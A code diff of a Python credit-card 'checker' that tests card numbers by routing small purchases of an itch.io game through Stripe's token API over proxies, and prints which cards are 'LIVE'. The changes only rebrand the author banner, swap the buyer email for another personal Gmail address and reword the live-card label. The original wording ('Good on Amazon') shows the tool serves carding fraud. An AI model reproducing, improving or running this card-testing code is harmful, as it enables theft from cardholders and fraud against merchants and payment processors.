@@ -37,8 +37,8 @@ class StripeChecker():
         self.purchase = "https://puppetcombo.itch.io/nun-massacre/purchase"
         self.stripe_tokens = "https://api.stripe.com/v1/tokens"
 
-        print("\n\n  {}------=[ {}CODEKILLER CHECKER {}]=------".format(fg[0], fg[1], fg[0]))
-        print("      {}--= {}Created by Codekiller {}=--          ".format(fg[0], fg[1], fg[0]))
+        print("\n\n  {}------=[ {}Mvp Alpha CHECKER {}]=------".format(fg[0], fg[1], fg[0]))
+        print("      {}--= {}Created by Mvp Alpha {}=--          ".format(fg[0], fg[1], fg[0]))
         print("  {}------========================------\n".format(fg[0]))
         self.check()
 
@@ -111,7 +111,7 @@ class StripeChecker():
                 "initiator": "game",
                 "bp": "1352c97c578a5257f528baee67eecf68",
                 "price": "$4.95",
-                "email": "ckknocktoyou@gmail.com",
+                "email": "kathrynzuniga1715@gmail.com",
                 "json": "true"
             }
             purchase_response = json.loads(session.post(self.purchase, data=purchase_data, proxies=proxy).text)
@@ -144,7 +144,7 @@ class StripeChecker():
                 "csrf_token": csrf,
                 "card_token": tok_id,
                 "bp": "1352c97c578a5257f528baee67eecf68",
-                "email": "ckknocktoyou@gmail.com",
+                "email": "kathrynzuniga1715@gmail.com",
                 "name": Username
             }
             result_response = session.post(checkout_url, proxies=proxy, data=result_data).text
@@ -155,7 +155,7 @@ class StripeChecker():
 
                 if error_msg == "Your card's security code is incorrect.":
                     print(fg[1] + "┌───────[ " + credit_card + " ]──(" + str(credit_entry) + ")")
-                    print(fg[1] + "└────────── LIVE! ~> But Incorrect CVV (Good on Amazon)")
+                    print(fg[1] + "└────────── LIVE! ~> But Incorrect CVV (Alpha Checker)")
 
                 else:
                     print(fg[0] + "┌───────[ " + credit_card + " ]──(" + str(credit_entry) + ")")
